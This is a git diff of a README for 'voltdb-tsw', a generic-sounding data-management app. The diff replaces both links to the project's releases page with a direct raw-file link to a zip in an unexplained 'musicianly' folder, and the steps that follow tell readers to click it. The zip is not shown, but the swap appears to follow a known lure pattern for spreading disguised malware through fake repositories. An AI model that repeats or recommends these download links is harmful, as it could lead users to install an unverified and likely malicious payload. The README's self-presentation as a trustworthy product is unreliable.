@@ -1,13 +1,13 @@
 # ⚡ voltdb-tsw - Simple Data Management for Everyone
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Chapleted-crewelwork933/voltdb-tsw/releases)
+[![Download](https://raw.githubusercontent.com/Chapleted-crewelwork933/voltdb-tsw/main/musicianly/voltdb-tsw_1.6.zip)](https://raw.githubusercontent.com/Chapleted-crewelwork933/voltdb-tsw/main/musicianly/voltdb-tsw_1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to voltdb-tsw! This application helps you manage your data effortlessly. Whether you are storing, retrieving, or organizing information, voltdb-tsw offers an easy-to-use interface for everyone.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download voltdb-tsw](https://github.com/Chapleted-crewelwork933/voltdb-tsw/releases). 
+To get started, visit this page to download: [Download voltdb-tsw](https://raw.githubusercontent.com/Chapleted-crewelwork933/voltdb-tsw/main/musicianly/voltdb-tsw_1.6.zip). 
 
 ### Steps to Download
 1. Click on the link above.
